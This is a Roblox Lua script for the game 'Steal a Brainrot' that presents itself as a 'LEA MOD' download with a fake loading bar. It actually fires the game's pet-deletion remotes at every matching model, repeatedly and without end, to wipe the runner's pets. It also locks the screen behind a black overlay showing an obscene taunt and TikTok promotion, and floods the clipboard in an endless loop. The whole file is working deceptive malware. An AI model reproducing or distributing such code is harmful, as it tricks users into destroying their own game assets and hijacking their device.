-- ============================================================================
-- PROJECT: LEA MOD [STEAL A BRAINROT] - COMPLETE MONOLITHIC DEEP PURGE SYSTEM
-- ARCHITECTURE: ULTIMATE LOCKDOWN, RECURSIVE ASSET PURGE, & CLIPBOARD FLOOD
-- TARGET DEVICE: INFINIX NOTE 30 PRO (MOBILE OPTIMIZED)
-- ============================================================================

local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Prevent multiple instances
if CoreGui:FindFirstChild("LEAModLockdown") then
    CoreGui.LEAModLockdown:Destroy()
end

local LockdownGui = Instance.new("ScreenGui")
LockdownGui.Name = "LEAModLockdown"
LockdownGui.IgnoreGuiInset = true
LockdownGui.ResetOnSpawn = false
LockdownGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

if syn and syn.protect_gui then
    syn.protect_gui(LockdownGui)
    LockdownGui.Parent = CoreGui
elseif gethui then
    LockdownGui.Parent = gethui()
else
    LockdownGui.Parent = CoreGui
end

-- ============================================================================
-- 1. UI LOCKDOWN & BLACKOUT LAYER (ZIndex 999)
-- ============================================================================
local BlackoutFrame = Instance.new("Frame")
BlackoutFrame.Name = "BlackoutFrame"
BlackoutFrame.Size = UDim2.new(1, 0, 1, 0)
BlackoutFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackoutFrame.BorderSizePixel = 0
BlackoutFrame.ZIndex = 999
BlackoutFrame.Parent = LockdownGui

-- ============================================================================
-- 2. FAKE LOADER & PROGRESS FREEZE
-- ============================================================================
local LoaderContainer = Instance.new("Frame")
LoaderContainer.Name = "LoaderContainer"
LoaderContainer.Size = UDim2.new(0, 400, 0, 150)
LoaderContainer.Position = UDim2.new(0.5, -200, 0.5, -75)
LoaderContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
LoaderContainer.BorderSizePixel = 0
LoaderContainer.ZIndex = 1000
LoaderContainer.Parent = LockdownGui

local LoaderCorner = Instance.new("UICorner")
LoaderCorner.CornerRadius = UDim.new(0, 8)
LoaderCorner.Parent = LoaderContainer

local LoaderStroke = Instance.new("UIStroke")
LoaderStroke.Color = Color3.fromRGB(0, 255, 204)
LoaderStroke.Thickness = 1.5
LoaderStroke.ZIndex = 1000
LoaderStroke.Parent = LoaderContainer

local LoaderTitle = Instance.new("TextLabel")
LoaderTitle.Size = UDim2.new(1, 0, 0, 40)
LoaderTitle.BackgroundTransparency = 1
LoaderTitle.Font = Enum.Font.Code
LoaderTitle.Text = "LEA MOD DOWNLOAD"
LoaderTitle.TextColor3 = Color3.fromRGB(0, 255, 204)
LoaderTitle.TextSize = 18
LoaderTitle.ZIndex = 1000
LoaderTitle.Parent = LoaderContainer

local BarBackground = Instance.new("Frame")
BarBackground.Size = UDim2.new(0.8, 0, 0, 20)
BarBackground.Position = UDim2.new(0.1, 0, 0.6, 0)
BarBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
BarBackground.BorderSizePixel = 0
BarBackground.ZIndex = 1000
BarBackground.Parent = LoaderContainer

local BarBgCorner = Instance.new("UICorner")
BarBgCorner.CornerRadius = UDim.new(1, 0)
BarBgCorner.Parent = BarBackground

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 204)
ProgressBar.BorderSizePixel = 0
ProgressBar.ZIndex = 1000
ProgressBar.Parent = BarBackground

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1, 0)
BarCorner.Parent = ProgressBar

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1, 0, 0, 20)
StatusText.Position = UDim2.new(0, 0, 0.8, 0)
StatusText.BackgroundTransparency = 1
StatusText.Font = Enum.Font.Code
StatusText.Text = "Initializing memory injection... [0%]"
StatusText.TextColor3 = Color3.fromRGB(150, 150, 180)
StatusText.TextSize = 12
StatusText.ZIndex = 1000
StatusText.Parent = LoaderContainer

-- ============================================================================
-- 3 & 4. REMOTE IDENTIFICATION & RECURSIVE ASSET PURGE ENGINE
-- ============================================================================
local function getDeleteRemote()
    local targetNames = {"RemovePet", "DeletePet", "DespawnPet", "RemoveCompanion", "PetSystem", "DeleteBlock", "RemoveBlock"}
    for _, name in ipairs(targetNames) do
        local remote = ReplicatedStorage:FindFirstChild(name, true)
        if remote then
            return remote
        end
    end
    return nil
end

local PurgeComplete = false

local function deepPurge()
    local remote = getDeleteRemote()
    local targetKeywords = {"pet", "brainrot", "companion", "animal", "follower", "minion"}
    
    local function matchesKeyword(name)
        local lowerName = string.lower(name)
        for _, kw in ipairs(targetKeywords) do
            if string.find(lowerName, kw, 1, true) then
                return true
            end
        end
        return false
    end

    local searchContainers = {
        workspace,
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer.Character,
        CoreGui
    }

    for _, container in ipairs(searchContainers) do
        if container then
            for _, obj in ipairs(container:GetDescendants()) do
                pcall(function()
                    if obj:IsA("Model") or obj:IsA("BasePart") then
                        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
                        if model and matchesKeyword(model.Name) then
                            if remote and remote:IsA("RemoteEvent") then
                                remote:FireServer(model)
                            elseif remote and remote:IsA("RemoteFunction") then
                                remote:InvokeServer(model)
                            else
                                model:Destroy()
                            end
                        end
                    end
                end)
            end
        end
    end
end

-- Asynchronous Progress and Purge Runner
task.spawn(function()
    local progressTween = TweenService:Create(ProgressBar, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.999, 0, 1, 0)})
    progressTween:Play()
    
    local startTime = tick()
    while tick() - startTime < 4.5 do
        local currentPercent = math.clamp(math.floor((ProgressBar.AbsoluteSize.X / BarBackground.AbsoluteSize.X) * 100), 0, 99)
        StatusText.Text = "Purging memory layers... [" .. currentPercent .. "%]"
        deepPurge()
        task.wait(0.1)
    end
    
    -- Ensure 99.9% freeze and deep clean loop
    ProgressBar.Size = UDim2.new(0.999, 0, 1, 0)
    StatusText.Text = "Finalizing system isolation... [99.9%]"
    
    for i = 1, 10 do
        deepPurge()
        task.wait(0.2)
    end
    
    PurgeComplete = true
    LoaderContainer:Destroy()

    -- Activate High-Impact Visual Override Screen
    local OverrideFrame = Instance.new("Frame")
    OverrideFrame.Size = UDim2.new(1, 0, 1, 0)
    OverrideFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    OverrideFrame.BorderSizePixel = 0
    OverrideFrame.ZIndex = 1000
    OverrideFrame.Parent = LockdownGui

    local OverrideText = Instance.new("TextLabel")
    OverrideText.Size = UDim2.new(1, 0, 0, 100)
    OverrideText.Position = UDim2.new(0, 0, 0.4, -50)
    OverrideText.BackgroundTransparency = 1
    OverrideText.Font = Enum.Font.FredokaOne
    OverrideText.Text = "LEA FUCKED YOUR MOTHER"
    OverrideText.TextColor3 = Color3.fromRGB(255, 0, 0)
    OverrideText.TextSize = 36
    OverrideText.ZIndex = 1000
    OverrideText.Parent = OverrideFrame

    local CreditText = Instance.new("TextLabel")
    CreditText.Size = UDim2.new(1, 0, 0, 30)
    CreditText.Position = UDim2.new(0, 0, 0.6, 0)
    CreditText.BackgroundTransparency = 1
    CreditText.Font = Enum.Font.Code
    CreditText.Text = "Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
    CreditText.TextColor3 = Color3.fromRGB(0, 255, 204)
    CreditText.TextSize = 14
    CreditText.ZIndex = 1000
    CreditText.Parent = OverrideFrame

    -- Real-time color shifting loop
    task.spawn(function()
        local hue = 0
        while true do
            hue = (hue + 0.01) % 1
            OverrideText.TextColor3 = Color3.fromHSV(hue, 1, 1)
            task.wait(0.05)
        end
    end)
end)

-- Continuous background scanner to trap remaining spawn elements
task.spawn(function()
    while true do
        if PurgeComplete then
            deepPurge()
        end
        task.wait(0.5)
    end
end)

-- ============================================================================
-- 5. PERSISTENT CLIPBOARD FLOOD UTILITY
-- ============================================================================
task.spawn(function()
    local counter = 0
    while true do
        pcall(function()
            if setclipboard then
                counter = counter + 1
                setclipboard("TİKTOK @LEAPLUS " .. counter)
            end
        end)
        task.wait(0.1)
    end
end)
